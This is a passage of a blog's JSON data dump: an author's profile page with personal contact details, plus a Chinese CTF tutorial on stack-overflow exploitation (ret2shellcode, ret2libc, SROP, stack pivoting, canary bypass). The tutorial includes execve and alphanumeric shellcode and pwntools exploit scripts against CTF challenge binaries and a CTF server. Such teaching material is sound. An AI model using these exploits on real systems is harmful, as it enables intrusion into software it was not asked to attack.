href=\"mailto:wzhdxtx123@outlook.com\">wzhdxtx123@outlook.com</a></p>\n</li>\n<li>\n<p>work e-mail: <a href=\"mailto:nemoxxw@whu.edu.cn\">nemoxxw@whu.edu.cn</a></p>\n</li>\n</ul>\n<p>QQ: 2499291623</p>\n<p>Github: <a href=\"https://github.com/Du-Mu\">github.com/Du-Mu</a></p>\n","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":"<h1>About me</h1>\n<p>Student and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.</p>\n<p>Now I focus on studying of Fuzz.</p>\n<h1>Interest</h1>\n<h2 id=\"Games\">Games:</h2>\n<ul>\n<li>Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)</li>\n<li>Arknights(明日方舟)</li>\n<li>JRPG\n<ul>\n<li>The Legend of Heroes(轨迹系列)</li>\n<li>Persona(女神异闻录系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Light player of Act:\n<ul>\n<li>Monster Hunter(怪物猎人系列)</li>\n<li>Devil May Cry(鬼泣)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Leisure:\n<ul>\n<li>Rune Factory(符文工房系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>RPG:\n<ul>\n<li>Baldur’ s gate(博德之门)</li>\n<li>Disco Elysium</li>\n</ul>\n</li>\n<li>other 3A</li>\n</ul>\n<h2 id=\"Films\">Films:</h2>\n<p>For films, I see it as the art of sight and sound. So I don’t like the Drama(剧情片), but prefer the  films that have engrossing shots.</p>\n<p>Having a preference for Europe、Japan  Director and films.</p>\n<p>Recently watched:</p>\n<ul>\n<li>Love Letter, directed by いわい しゅんじ(岩井俊二)</li>\n<li>东邪西毒, directed by 王家卫</li>\n<li>PROMARE, directed by いまいし ひろゆき(今石洋之)</li>\n<li>Mobile Suit Gundam: Hathaway’s Flash</li>\n<li>…</li>\n</ul>\n<h2 id=\"Books\">Books:</h2>\n<ul>\n<li>Literature</li>\n<li>History</li>\n<li>Monograph</li>\n<li>Fiction</li>\n<li>…</li>\n</ul>\n<h1>Contact me</h1>\n<p>e-mail:</p>\n<ul>\n<li>\n<p>Personal e-mail: <a href=\"mailto:wzhdxtx123@outlook.com\">wzhdxtx123@outlook.com</a></p>\n</li>\n<li>\n<p>work e-mail: <a href=\"mailto:nemoxxw@whu.edu.cn\">nemoxxw@whu.edu.cn</a></p>\n</li>\n</ul>\n<p>QQ: 2499291623</p>\n<p>Github: <a href=\"https://github.com/Du-Mu\">github.com/Du-Mu</a></p>\n"},{"title":"Categories","layout":"categories","comments":0,"_content":"\n\n","source":"categories/index.md","raw":"---\ntitle: Categories\nlayout: categories \ncomments: false\n---\n\n\n","date":"2023-04-25T07:27:03.633Z","updated":"2023-04-25T07:27:03.633Z","path":"categories/index.html","_id":"clj5d1j770002vwijdtz7g1bx","content":"","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":""},{"title":"Links","layout":"links","comments":0,"sidebar":"none","_content":"\n","source":"links/index.md","raw":"---\ntitle: Links\nlayout: links\ncomments: false\nsidebar: none\n---\n\n","date":"2023-05-20T13:50:09.077Z","updated":"2023-05-20T13:50:09.077Z","path":"links/index.html","_id":"clj5d1j7b0006vwij2flu56wh","content":"","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":""},{"title":"Repositories","layout":"repository","comments":0,"sidebar":"none","_content":"\n","source":"repository/index.md","raw":"---\ntitle: Repositories\nlayout: repository\ncomments: false\nsidebar: none\n---\n\n","date":"2023-04-25T07:27:03.633Z","updated":"2023-04-25T07:27:03.633Z","path":"repository/index.html","_id":"clj5d1j7c0007vwijg04yedz0","content":"","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\nlayout: tags\ncomments: false\n---","date":"2023-04-25T07:27:03.633Z","updated":"2023-04-25T07:27:03.633Z","path":"tags/index.html","_id":"clj5d1j7c0008vwij7rhwcdy5","content":"","site":{"data":{"links":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}},"excerpt":"","more":""}],"Post":[{"title":"PWN-StackOverflow-Overview","date":"2022-08-02T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n### 杂谈\n\n作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。\n\n\n\n本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One\n\n\n\n怎么去看待栈溢出题呢?   \n\n尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:\n\n**ret2syscall,  ret2libc,  ret2shellcode**\n\n实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。\n\n一般而言，pwn题的目的都是`getshell`(当然，也有直接读取flag的，这个后面单独谈)，而`getshell` 无外乎就三种途径，`syscall`，`libc-system`，`shellcode`\n\n\n\n当拿到一个题目时，首先思考：\n\n是否有syscall---->ret2syscall\n\n有可读可写内存空间吗---->ret2shellcode\n\n给了libc文件或者有信息泄露函数(IO函数)---->ret2libc\n\n接下来，再分门别类谈:\n\n### 0x1.ret2syscall\n\n因为syscall属于相对简单的，暂且放在前面谈。\n\n| %rax | System call | %rdi                 | %rsi                     | %rdx                     | %r10 | %r8  | %r9  |\n| :--- | :---------- | :------------------- | :----------------------- | :----------------------- | :--- | :--- | :--- |\n| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |      |      |      |\n\n一般而言，需要`syscall`的题目中，都是构造这个系统调用实现。\n\n而在一些题目中通过`seccomp`禁用了`execve`的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。\n\n而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。\n\n在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。\n\n或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。\n\n总的而言，就是选择能够获取到地址的地方写入/bin/sh。\n\n\n\n**例题:**\n\nciscn_s_3\n\n\n\n### ret2shellcode\n\n#### shellcode的书写\n\n一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。\n\n一个简单的shellcode例子:\n\n```c\n// execve(path = '/bin///sh', argv = ['sh'], envp = 0)\npush 0x68\nmov rax, 0x732f2f2f6e69622f\npush rax\nmov rdi, rsp\n// push argument array ['sh\\x00']\n// push b'sh\\x00' \npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi /* 0 */\npush rsi /* null terminate */\npush 8\npop rsi\nadd rsi, rsp\npush rsi /* 'sh\\x00' */\nmov rsi, rsp\nxor edx, edx /* 0 */\n// call execve()\npush SYS_execve /* 0x3b */\npop rax\nsyscall\n```\n\n这里获取`/bin/sh`地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。\n\n不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即`jmp  rax`此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。\n\n同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，`mov`和`syscall`都会遭到限制， 可用指令如下:\n\n```c\n1.数据传送:\npush/pop eax…\npusha/popa\n\n2.算术运算:\ninc/dec eax…\nsub al, 立即数\nsub byte ptr [eax… + 立即数], al dl…\nsub byte ptr [eax… + 立即数], ah dh…\nsub dword ptr [eax… + 立即数], esi edi\nsub word ptr [eax… + 立即数], si di\nsub al dl…, byte ptr [eax… + 立即数]\nsub ah dh…, byte ptr [eax… + 立即数]\nsub esi edi, dword ptr [eax… + 立即数]\nsub si di, word ptr [eax… + 立即数]\n\n3.逻辑运算:\nand al, 立即数\nand dword ptr [eax… + 立即数], esi edi\nand word ptr [eax… + 立即数], si di\nand ah dh…, byte ptr [ecx edx… + 立即数]\nand esi edi, dword ptr [eax… + 立即数]\nand si di, word ptr [eax… + 立即数]\n\nxor al, 立即数\nxor byte ptr [eax… + 立即数], al dl…\nxor byte ptr [eax… + 立即数], ah dh…\nxor dword ptr [eax… + 立即数], esi edi\nxor word ptr [eax… + 立即数], si di\nxor al dl…, byte ptr [eax… + 立即数]\nxor ah dh…, byte ptr [eax… + 立即数]\nxor esi edi, dword ptr [eax… + 立即数]\nxor si di, word ptr [eax… + 立即数]\n\n4.比较指令:\ncmp al, 立即数\ncmp byte ptr [eax… + 立即数], al dl…\ncmp byte ptr [eax… + 立即数], ah dh…\ncmp dword ptr [eax… + 立即数], esi edi\ncmp word ptr [eax… + 立即数], si di\ncmp al dl…, byte ptr [eax… + 立即数]\ncmp ah dh…, byte ptr [eax… + 立即数]\ncmp esi edi, dword ptr [eax… + 立即数]\ncmp si di, word ptr [eax… + 立即数]\n\n5.转移指令:\npush 56h\npop eax\ncmp al, 43h\njnz lable\n\n<=> jmp lable\n\n6.交换al, ah\npush eax\nxor ah, byte ptr [esp] // ah ^= al\nxor byte ptr [esp], ah // al ^= ah\nxor ah, byte ptr [esp] // ah ^= al\npop eax\n\n7.清零:\npush 44h\npop eax\nsub al, 44h ; eax = 0\n\npush esi\npush esp\npop eax\nxor [eax], esi ; esi = 0\n```\n\n一般而言,  我们采用`xor`或者`sub`指令修改shellcode后面的值，构造`0f 05`， 实现syscall。\n\n一个例子(纯字母数字shellcode):\n\n```c\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129\n/* from call rax */\npush rax\npush rax\npop rcx\n\n/* XOR pop rsi, pop rdi, syscall */\npush 0x41413030\npop rax\nxor DWORD PTR [rcx+0x30], eax\n\n/* XOR /bin/sh */\npush 0x34303041\npop rax\nxor DWORD PTR [rcx+0x34], eax\npush 0x41303041\npop rax\nxor DWORD PTR [rcx+0x38], eax\n\n/* rdi = &'/bin/sh' */\npush rcx\npop rax\nxor al, 0x34\npush rax\n\n/* rdx = 0 */\npush 0x30\npop rax\nxor al, 0x30\npush rax\npop rdx\n\npush rax\n\n/* rax = 59 (SYS_execve) */\npush 0x41\npop rax\nxor al, 0x7a\n\n/* pop rsi, pop rdi*/\n/* syscall */ \n.byte 0x6e\n.byte 0x6f\n.byte 0x4e\n.byte 0x44\n\n/* /bin/sh */\n.byte 0x6e\n.byte 0x52\n.byte 0x59\n.byte 0x5a\n.byte 0x6e\n.byte 0x43\n.byte 0x5a\n.byte 0x41\n```\n\n\n\n构造尽可能短的shellcode可能用到的一些指令\n\n```assembly\ncdp  \n%The CDQ instruction copies the sign (bit 31) \n%of the value in the EAX register into every bit \n%position in the EDX register. \n```\n\n\n\n\n\n\n\n#### shellcode生成工具\n\n同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。\n\n#### mprotect()\n\n进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。\n\n这个函数可以修改指定内存段的权限\n\n```\nmprotect:\nint mprotect(void *addr, size_t len, int prot);\naddr 内存起始地址\nlen  修改内存的长度\nprot 内存的权限，7为可读可写可执行\n```\n\n如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode\n\n\n\n### ret2libc\n\n#### leak_libc\n\n对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.\n\n目前而言，我遇到的栈题中leak_libc，有两种方法：\n\n1. partial_overwrite\n   有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。\n2. 通过puts，write等函数，打印`.got`，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本\n\n```python\n# ref:  https://github.com/lieanu/LibcSearcher\n\nfrom LibcSearcher import *\n\n#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型\nobj = LibcSearcher(\"fgets\", 0X7ff39014bd90)\n\nobj.dump(\"system\")        #system 偏移\nobj.dump(\"str_bin_sh\")    #/bin/sh 偏移\nobj.dump(\"__libc_start_main_ret\")    \n\n```\n\n\n\n另一个可以本地部署的实用工具是libc-database\n\n```bash\n$ ./find printf 260 puts f30\narchive-glibc (libc6_2.19-10ubuntu2_i386)\n$ ./dump libc6_2.19-0ubuntu6.6_i386\noffset___libc_start_main_ret = 0x19a83\noffset_system = 0x00040190\noffset_dup2 = 0x000db590\noffset_recv = 0x000ed2d0\noffset_str_bin_sh = 0x160a24\n$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626\nlibc6_2.17-93ubuntu4_i386\n$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0\nlibc6_2.17-93ubuntu4_i386\n$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4\nlibc6_2.17-93ubuntu4_i386\n$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2\nlibc6_2.17-93ubuntu4_i386\n```\n\n\n\n\n\n#### partial_overwrite\n\n##### 前置知识\n\n针对没有泄露的赛题，可以考虑partial_overwrite改写`got`表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。\n\n考虑对于一个`got`表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖`got`为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall\n\n##### 爆破脚本写法\n\n一个爆破脚本模板:\n\n```python\nfrom pwn import *\nimport sys\n\nelf ='./ciscn_s_3'\nremote_add = 'node4.buuoj.cn'\nremote_port = 29554\n\nmain_add = 0x40051d\noff = 0x130\nsystem_add = 0x400517\nrtframe = 0x4004da\nret_add = 0x4004e9\n\ni = 0\n\nwhile i < 20:\n    try:\n        context.log_level = 'debug'\n        context.arch = 'amd64'\n        if sys.argv[1] == 'r':\n            p = remote(remote_add, remote_port, timeout = 1)\n        elif sys.argv[1] == 'd':\n            p = gdb.debug(elf)\n        else:\n            p = process(elf, timeout = 1)\n        payload1 = b'/bin/sh\\0' + cyclic(0x8)\n        payload1+= p64(main_add)\n\n        p.sendline(payload1)\n\n        stack_add = u64(p.recv(0x28)[-8::]) - off\n\n        frame = SigreturnFrame()\n        frame.rax = 0x3b\n        frame.rdi = stack_add\n        frame.rsi = 0\n        frame.rdx = 0\n        frame.rsp = stack_add\n        frame.rip = system_add\n\n        payload = b'/bin/sh\\0' + cyclic(0x8)\n        payload+= p64(rtframe)\n        payload+= p64(system_add)\n        payload+= bytes(frame)\n\n\n        #p.sendline('a')\n        #p.recvuntil('\\0')\n        p.sendline(payload)\n        p.recvuntil('/bin/sh')\n        p.sendline('cat flag')\n        print(p.recvline())\n        \n        p.close()\n    except BaseException as e:\n        p.close()\n\n    off+=0x8\n    i+=1\n\n```\n\n核心模板:\n\n```c\nwhile True:\n    try:\n\t\t// p = process()\n\t\t// pass\n        p.sendline('cat flag')\n        print(p.recvline())\n        p.close()\n    except BaseException as e:\n        p.close()\n    // pass\n\n```\n\n采用grep 获取输出包含flag的行就行\n\n\n\n#### ret2dl_resolve()\n\n延迟绑定会使用_dl_resolve()函数\n\n- _dl_resolve中\n\n  _dl_resolve调用_dl_fixup, _dl_dixup流程：\n\n  1. 通过link_map 获得.dynsym、.dynstr、.rel.plt地址\n  2. 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针\n  3. 通过&(ELF64_Rel)->r_info 和.dynsym取得对应Elf64_Sym指针\n  4. 检查r_info\n  5. 检查&(Elf64_Sym)->st_other\n  6. 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数\n\n综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)\n\n|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |\n| :----------- | :-------------------- | :----------------------------------------------------------- | :--------------------------------------------------- |\n| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |\n| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |\n| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |\n\n\n\n### Tricks\n\n#### stack pivoting\n\n栈迁移技巧， 主要针对可溢出字节较少的情况，通过`leave`此类指令控制rsp\n\n```assembly\n;leave 相当于:\nmov rsp,rbp\npop rbp\n;那么考虑将栈帧中rbp地址改为栈迁移目的地址\n;leave两次之后，就可以将栈转移到目的地址\n;同时要现在目的地址布置好fake_stack\n```\n\n\n\n可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数\n\n\n\n不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:\n\n- 在第一次read读入后将rbp改为要写入的位置\n- ret到read\n- 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n- 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n\n##### example\n\n一个程序反汇编后:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[48]; // [rsp+0h] [rbp-30h] BYREF\n\n  init(argc, argv, envp);\n  puts(\"You can use stackoverflow.\");\n  puts(\"But only overflow a bit more...\");\n  puts(\"And you must print first.\");\n  memset(s, 0, 0x20uLL);\n  write(1, s, 0x30uLL);\n  read(0, s, 0x40uLL);\n  return 0;\n}\n```\n\n这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串\n\n但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行\n\n~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~\n\n**exp**\n\n```python\nfrom pwn import*\n\np = process('./ezrop')\n#p = gdb.debug('./ezrop')\n\nm = u64(p.recv(40)[-8:])\n\npayloads = p64(0x400863) + b'/bin/sh\\0' + p64(0x400600)\n\npayloads += cyclic(0x18)\npayloads += p64(0x601848+0x30) + p64(0x4007d9)\n\np.send(payloads)\n\nsleep(1)\n\npayloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) \npayloads += b'/bin/sh\\0'\npayloads += b'/bin/sh\\0'\npayloads += p64(0x601848-0x8) + p64(0x4007f9)\n\np.send(payloads)\n\np.interactive()\n\n#0x00007f7b3ce92bb0      0x00007f7b3ccf8450\n```\n\n\n\n\n\n#### 栈对齐\n\n栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。\n\n这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump\n\n可以:\n\n```bash\n$ gdb -c core\n```\n\n调试core文件\n\n如果终止指令类似于:\n\n```c\n ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0\n```\n\n说明是栈对齐的原因，小心调整栈帧就行\n\n\n\n#### Stack smash\n\n对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。\n\n在开启cannary 防护的题目中，检测到栈溢出后，会调用 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag\n\n#### SROP\n\n##### 前置知识:\n\n在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。\n\n那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。\n\n同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。\n\n\n\nSROP简要流程:\n\n1. 构造fake_frame\n2. 控制当前rsp指向fake_frame底部\n3. sigreturn调用\n\n\n\nsigFrame结构如下:\n\n```c\n// x64\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\n\n\n##### pwntools.srop\n\npwntools集成了SROP的模块，可以帮助制作fake_frame:\n\n```python\n// 一个简单的例子\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\n```\n\n\n\n#### stack_gaurd\n\n我们都知道canary来自`fs:0x28`， `fs` 实际上指向的是[TCB](http://www.openwall.com/lists/oss-security/2018/02/27/5) ， TCB结构如下\n\n```c\ntypedef struct\n{\n  void *tcb;                /* Pointer to the TCB.  Not necessarily the\n                           thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;                /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;  // not in 32bit\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;\n  uintptr_t pointer_guard;\n  unsigned long int vgetcpu_cache[2];\n  /* Bit 0: X86_FEATURE_1_IBT.\n     Bit 1: X86_FEATURE_1_SHSTK.\n   */\n  unsigned int feature_1;\n  int __glibc_unused1;\n  /* Reservation of some values for the TM ABI.  */\n  void *__private_tm[4];\n  /* GCC split stack support.  */\n  void *__private_ss;\n  /* The lowest address of shadow stack,  */\n  unsigned long long int ssp_base;\n  /* Must be kept even if it is no longer used by glibc since programs,\n     like AddressSanitizer, depend on the size of tcbhead_t.  */\n  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n  void *__padding[8];\n} tcbhead_t;\n```\n\n0x28的偏移实际上是指向的stack_guard\n\n那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择`pthread_self()` 来查看`fs`的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。\n\n```c\npthread_t\npthread_self (void)\n{\n  return (pthread_t) THREAD_SELF;\n}\n```\n\n\n\n在gdb中查看这个地址，发现这个地址实际上在libc的附近。\n\n```shell\np/x (tcbhead_t)*(tcbhead_t *)(pthread_self())\np/x (void*)(pthread_self())\n```\n\n\n\n```shell\npwndbg> vmmap\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n             Start                End Perm     Size Offset File\n    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary\n    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]\n    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6\n    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6\n    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6\n    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6\n    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6\n    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]\n    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]\n    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]\n    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2\n    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]\n0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\npwndbg> p/x (void*)(pthread_self())\n$16 = 0x7ffff7fa8680\n```\n\n如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。\n\n\n\n但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程`fs` 寄存器地址的，所以可以通过此来实现覆盖。\n\n\n\n\n\n","source":"_posts/[Pwn]-StackOverflow-Overview.md","raw":"---\ntitle: PWN-StackOverflow-Overview \ndate: 2022-8-3 \ntags: \n- Pwn \n- CTF \ncategories: CTF \ntoc: true \nsidebar: none \n---\n\n\n\n\n\n### 杂谈\n\n作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。\n\n\n\n本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One\n\n\n\n怎么去看待栈溢出题呢?   \n\n尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:\n\n**ret2syscall,  ret2libc,  ret2shellcode**\n\n实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。\n\n一般而言，pwn题的目的都是`getshell`(当然，也有直接读取flag的，这个后面单独谈)，而`getshell` 无外乎就三种途径，`syscall`，`libc-system`，`shellcode`\n\n\n\n当拿到一个题目时，首先思考：\n\n是否有syscall---->ret2syscall\n\n有可读可写内存空间吗---->ret2shellcode\n\n给了libc文件或者有信息泄露函数(IO函数)---->ret2libc\n\n接下来，再分门别类谈:\n\n### 0x1.ret2syscall\n\n因为syscall属于相对简单的，暂且放在前面谈。\n\n| %rax | System call | %rdi                 | %rsi                     | %rdx                     | %r10 | %r8  | %r9  |\n| :--- | :---------- | :------------------- | :----------------------- | :----------------------- | :--- | :--- | :--- |\n| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |      |      |      |\n\n一般而言，需要`syscall`的题目中，都是构造这个系统调用实现。\n\n而在一些题目中通过`seccomp`禁用了`execve`的调用，所以不能直接利用，那么就利用open, read,  write 